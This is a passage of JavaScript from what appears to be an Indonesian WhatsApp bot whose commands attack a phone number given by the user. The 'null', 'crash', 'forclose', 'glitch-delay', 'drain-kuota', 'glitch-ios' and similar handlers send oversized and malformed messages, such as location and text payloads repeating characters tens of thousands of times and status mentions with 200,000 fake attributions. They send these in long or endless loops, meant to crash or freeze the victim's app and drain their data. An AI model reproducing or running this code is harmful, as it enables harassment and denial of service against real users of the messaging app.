                        text: `*BUG CLEARED BY 💦${global.botname}*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${global.footer}`
                    })
                    await sleep(2000)
                }
                sukses++
            } catch (e) {
                gagal++
                console.log(`Gagal clear bug di ${gid}`, e)
            }
        }
    
        reply(`✅ CLEAR BUG SELESAI\n✔️ Berhasil : ${sukses}\n❌ Gagal : ${gagal}`)
    }
    break
    //═════════════════════════════════════//
    case "null": {
        if (!isOwner) return
        if (!q) return reply(`target number`);
        
        let targetNumber = q.replace(/[^0-9]/g, "");
        const jids = targetNumber + "@s.whatsapp.net";
        const X = jids; 
    
        const gerarJidAleatorio = () => {
            const ddis = ['41', '91', '90', '31', '40'];
            const ddiAleatorio = ddis[Math.floor(Math.random() * ddis.length)];
            return `${ddiAleatorio}${Math.floor(Math.random() * 1e10).toString().padStart(10, "0")}@s.whatsapp.net`;
        };
    
        const criarStatusAttributions = (limite) => {
            const lista = [];
            for (let i = 0; i < limite; i++) {
                lista.push({
                    participant: gerarJidAleatorio(),
                    type: 1
                });
            }
            return lista;
        };
    
        reply(`> ＜＝＞ ${targetNumber}`);
        
        while (true) {
            try {
                await sock.relayMessage("status@broadcast", {
                    "viewOnceMessage": {
                        "message": {
                            "listResponseMessage": {
                                "title": "x",
                                "listType": 1,
                                "singleSelectReply": { "selectedRowId": "id", },
                                "description": "x",
                                "contextInfo": {
                                    "remoteJid": "status@broadcast",
                                    "fromMe": true,
                                    "isQuestion": true,
                                    "forwardedAiBotMessageInfo": {
                                        "botJid": "13135550202@bot",
                                        "botName": "Business Assistant",
                                        "creator": "lol"
                                    },
                                    "statusAttributionType": 2,
                                    "statusAttributions": criarStatusAttributions(200000),
                                },
                            }
                        }
                    }
                }, {
                    "statusJidList": [jids],
                    "additionalNodes": [{
                        "tag": "meta",
                        "attrs": { "status_setting": "contacts" },
                        "content": [{
                            "tag": "mentioned_users",
                            "is_status_mention": true,
                            "attrs": {},
                            "content": [jids].map(jid => ({
                                "tag": "to",
                                "attrs": { jid }
                            }))
                        }]
                    }]
                });
    
                
                let locationMessage = {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    jpegThumbnail: null,
                    name: "X" + "𖣂".repeat(15000),
                    address: "X" + "𖣂".repeat(5000),
                    url: `https://api-jhon-xs.${"𖣂".repeat(25000)}.com`,
                }
                let msg = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: {
                            locationMessage
                        }
                    }
                }, {});
    
                await sock.relayMessage('status@broadcast', msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [X],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: X
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });
    
                let extendMsg = {
                    extendedTextMessage: {
                        text: "Jhon xml",
                        matchedText: "https://t.me/itssdric",
                        description: "ios turbo - 1080".repeat(15000),
                        title: "— !s Cancer Trashflocks".repeat(15000),
                        previewType: "NONE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
                        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                        mediaKeyTimestamp: "1743101489",
                        thumbnailHeight: 641,
                        thumbnailWidth: 640,
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                }
                let msg2 = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: {
                            extendMsg
                        }
                    }
                }, {});
    
                await sock.relayMessage('status@broadcast', msg2.message, {
                    messageId: msg2.key.id,
                    statusJidList: [X],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: X
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });
    
                console.log(`＜＝＞ :3 : ${targetNumber}`);
                await sleep(3000); 
    
            } catch (e) {
                console.error("error :", e);
                await sleep(5000); 
            }
        }
    }
    break;
    //═══════════════════════════════════//
    case 'crash-invis': case 'bug1': 
    case 'glitch-crash': case 'crash': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 123; i++) {
            await ButGsUM(target)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Crash Invis!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'test-bug': case 'testbug': case 'forclose': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 1; i++) {
            await xCursedFC(sock, target)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Force Close!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'bug2': case 'glitch-delay': case 'delay-invis': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 567; i++) {
            await sponkDelay(sock, target);
            await trckSQL(sock, target);
            await Null(target);
            await Null(target);
            console.log(chalk.red.bold("🩸Success sending Bug Type : Delay Hard!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'bug5': case 'glitch-drain': case 'drain-kuota': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 100; i++) {
            await CosmoDrain(sock, target)
            await CosmoDrain(sock, target)
            await bulldozerDelay2GB(sock, target)
            await sleep(500)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Drain Kuota!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'bug3': case 'glitch-blank': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 33; i++) {
            await CrashNotifByMia(target)
            await sleep(1500)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Blank UI!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'glitch-freeze': 
    case 'glitch-frezee': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 123; i++) {
            await crashIclick(sock, target)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Freeze Invisible!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'bug4': case 'glitch-combo': case 'xspam': 
    case 'glitch-spam': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 900; i++) {
            await sponkDelay(sock, target)
            await CosmoDrain(sock, target)
            await bulldozerDelay2GB(sock, target)
            console.log(chalk.red.bold("🩸Success sending Bug Type : Combination!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'bug6': case 'glitch-ios': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!q) return reply(`${noticenya}*Contoh: ${prefix + command} 628xxx*`);
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
    
        if (jidx.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Contoh : ${prefix + command} *628xxx*`)
    
        let user = m.sender
        let now = Date.now()
        let cooldowns = loadCooldowns()
    
        const blockedNum = DevNumber;
        let target = jidx + "@s.whatsapp.net";
        
        await reaction(m.chat, "♠️")
        await sleep(1000)
        
        let reportMsg = `⨭ *WAIT..* *SENDING BUG*\n\n— *STATUS:*\n⭔ Target : *${jidx}*\n⭔ Type: *${command}*\n⭔ Status : *ON PROSES*`
        
        await sock.sendMessage(m.chat, {
          interactiveMessage: {
            title: reportMsg,
            footer: global.footer,
            thumbnail: global.thumb,
            contextInfo: {
              mentionedJid: [m.sender], 
              isForwarded: true, 
              forwardingScore: 250930,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran ,
                serverId: 999
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Cek Target",
                    url: `https://wa.me/${jidx}`
                  })
                }
              ]
            }
          }
      }, { quoted: contactQ });
      try {
        if (target === blockedNum) return reply('Ngapain Lu?, Maklo aj noh bug, itu dev tolol');

        //Pengulangan Didalam Pengulangan
        for (let i = 0; i < 123; i++) {
            await CrashIos(sock, target)
            await sleep(500)
            console.log(chalk.red.bold("🩸Success Sending Bug Type : Ios Crash!!"))
        }
      } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengirim ${command}: ` + err.message);
      }
      // Simpan cooldown
      cooldowns[user] = now
      saveCooldowns(cooldowns)
    }
    break
    //═══════════════════════════════════//
    case 'ch1': case 'crash-ch': case 'freeze-ch': {
      if (!isOwner && !isMurbug) return reply('Lu Siapa Bego? Khusus Premium')
      if (!q) return reply(`Example : ${command} 62xxx`)
      
      let target = `${m.chat}`
      rDone(`[ √ ] Success Bug : ${pepec}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
      await sleep(2000);
      await fcch(target);
    }
    break
    //════════════════════════════════════════//
    case 'ch2': case 'delay-ch': {
      if (!isOwner && !isMurbug) return reply('Lu Siapa Bego? Khusus Premium')
